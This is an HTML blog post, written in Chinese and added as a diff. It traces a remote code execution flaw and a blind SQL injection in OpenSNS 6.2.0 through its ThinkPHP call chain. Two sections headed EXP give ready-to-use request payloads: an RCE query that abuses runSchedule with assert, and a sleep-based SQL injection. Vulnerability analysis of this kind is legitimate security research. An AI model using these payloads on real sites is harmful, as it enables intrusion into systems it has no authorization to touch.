@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Blog Of SEVENTEEN</title>
+
+    <link rel = "Shortcut Icon" href="../img/favicon.ico">
+
+    <!-- Bootstrap core CSS -->
+    <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom fonts for this template -->
+    <link href="../vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet'
+          type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800'
+          rel='stylesheet' type='text/css'>
+
+    <!-- Custom styles for this template -->
+    <link href="../css/clean-blog.min.css" rel="stylesheet">
+
+    <!-- Code highlight-->
+    <link rel="stylesheet" href="../highlight/styles/atom-one-dark.css">
+
+</head>
+
+<body>
+
+<!-- Navigation -->
+<nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+        <a class="navbar-brand" href="../index.html">Index</a>
+        <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse"
+                data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false"
+                aria-label="Toggle navigation">
+            Menu
+            <i class="fas fa-bars"></i>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarResponsive">
+            <ul class="navbar-nav ml-auto">
+                <li class="nav-item">
+                    <a class="nav-link" href="../index.html">Home</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../about.html">About</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../contact.html">Contact</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+<!-- Page Header -->
+<header class="masthead" style="background-image: url('../img/post-bg.jpeg')">
+    <div class="overlay"></div>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <div class="post-heading">
+                    <h1>OPENSNS 漏洞分析</h1>
+                    <h2 class="subheading">OPENSNS RCE漏洞,SQL盲注</h2>
+                    <span class="meta">Posted by
+              <a href="#">SEVENTEEN</a>
+              on October 15, 2021</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+
+                <h2 class="section-heading">前言</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;在打第五空间线下赛的时候，在流量中捕获到opensns的一个payload，
+                	当时只是找了一下调用call_user_func_array()的点去做了过滤。因为忙着打项目，有一段时间没审计PHP了，正好拿这个cms来练练手。</p>
+                	
+                	
+                <h2 class="section-heading">影响范围</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;opensns 6.2.0(其它历史版本未做测试)</p>
+                
+                <h2 class="section-heading">配置环境</h2>
+                
+                <div>
+                	
+                	<pre class='hljs'><code><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/os.opensns.cn/product</span><span class="hljs-regexp">/index/download</span></code></pre>
+                	
+                </div>
+                
+                
+                <h2 class="section-heading">OPENSNS RCE</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;首先来到ShareController这个控制器，有用过学过TP开发的都能看出来这里绑定了变量去渲染到前端。
+                	在display方法之前还调用了T('Weibo@default/Widget/share/sharebox')。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-10-15/1-1.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;跟进一下T方法可以看到注释中写明了该方法用于获取存在的模版文件以及格式。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-10-15/1-2.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;直接定位到微博模块的默认模版，可以看到调用了W方法，并且把接收的参数param一同传入。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-10-15/1-3.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;可以看到W方法调用了R方法，并且调用了Widget控制层。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-10-15/1-4.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;W方法中先是调用了A方法去实例化类return给$class，然后调用了call_user_func_array去调用$class并传参进去。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-10-15/1-5.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;来到ShareWidget控制器中的fetchShare方法，带着一开始传入的变量进入assginFetch方法。
+                	这里把$show渲染到模版输出，所以重点看一下$show的值是什么。$show是D方法的返回类去调用getInfo()方法的返回值。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-10-15/1-6.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;进入D方法可以看到该方法用于实例化模型类，先不看payload用什么模型类，
+                	来看看getInfo()方法做了什么。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-10-15/1-7.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;可以看到getInfo方法中再次调用了D方法，而D方法前面分析过是用来实例化模型类的。
+                	所以，目前可以实例化一个模型类并且一个参数可控。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-10-15/1-8.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;payload中找了个只有一个参数的跳板方法去调用另外一个具有call_user_func_array函数去执行，
+                	还是用D方法去实例化目标类。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-10-15/1-9.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;最后，把参数排进数组中去call_user_func_array去执行。
+                	这里由一个参数变为两个参数的具体变化跟payload构造，可以从runSchedule方法往后动调一下就能明白了。
+                	不过需要注意的是payload中的id[4]=function不能改为id[4]=callback，否则call_user_func_array无法调用函数。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-10-15/1-10.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;payload第二个参数记得url编码，否则会被当作其它参数。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-10-15/1-11.jpg" alt="">
+                </a>
+                
+                <h2 class="section-heading">EXP</h2>
+                
+                <div>
+                	
+                	<pre class='hljs'><code>?s=weibo/share/shareBox&amp;query=app=<span class="hljs-type">Common</span>%<span class="hljs-number">26</span>model=<span class="hljs-type">Schedule</span>%<span class="hljs-number">26</span><span class="hljs-keyword">method</span>=runSchedule%<span class="hljs-number">26</span>id[<span class="hljs-keyword">method</span>]=-%<span class="hljs-number">3</span>E_validationFieldItem%<span class="hljs-number">26</span>id[status]=<span class="hljs-number">1</span>%<span class="hljs-number">26</span>id[<span class="hljs-number">4</span>]=function%<span class="hljs-number">26</span>id[<span class="hljs-number">1</span>]=assert%<span class="hljs-number">26</span>id[args]=cmd=phpinfo()%<span class="hljs-number">26</span>id[<span class="hljs-number">0</span>]=cmd</code></pre>
+                	
+                </div>	
+                
+                
+                <h2 class="section-heading">OPENSNS SQL INJECTION</h2>
+
+								<p>&nbsp;&nbsp;&nbsp;将调用runSchedule方法改为execute方法即可。
+									一开始我改的是_validationFieldItem那里，发现SQL注入总在parseSql出问题，
+									回头改成runSchedule方法才注入成功。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-10-15/2-1.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;但有个不足的就是return回来的值是影响的列数，所以无回显只能做盲注。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-10-15/2-2.jpg" alt="">
+                </a>
+                
+                <h2 class="section-heading">EXP</h2>
+                
+                <div>
+              	
+              	<pre class='hljs'><code>?s=weibo/share/shareBox&amp;query=app=<span class="hljs-type">Common</span>%<span class="hljs-number">26</span>model=<span class="hljs-type">Schedule</span>%<span class="hljs-number">26</span><span class="hljs-keyword">method</span>=execute%<span class="hljs-number">26</span>id=<span class="hljs-type">SELECT</span>%<span class="hljs-number">20</span>sleep(<span class="hljs-number">3</span>);</code></pre>
+              	
+                </div>
+           
+           
+           
+                <h2 class="section-heading">There Is Nothing Below</h2>
+                <p>&nbsp;&nbsp;&nbsp;</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
+                </a>
+                <span class="caption text-muted">Turn at the next intersection.</span>
+
+                <blockquote class="blockquote">
+                </blockquote>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <ul class="list-inline text-center">
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                </ul>
+                <p class="copyright text-muted">Copyright &copy; SEVENTEEN 2021</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- Bootstrap core JavaScript -->
+<script src="../vendor/jquery/jquery.min.js"></script>
+<script src="../vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+<!-- Custom scripts for this template -->
+<script src="../js/clean-blog.min.js"></script>
+
+</body>
+
+</html>
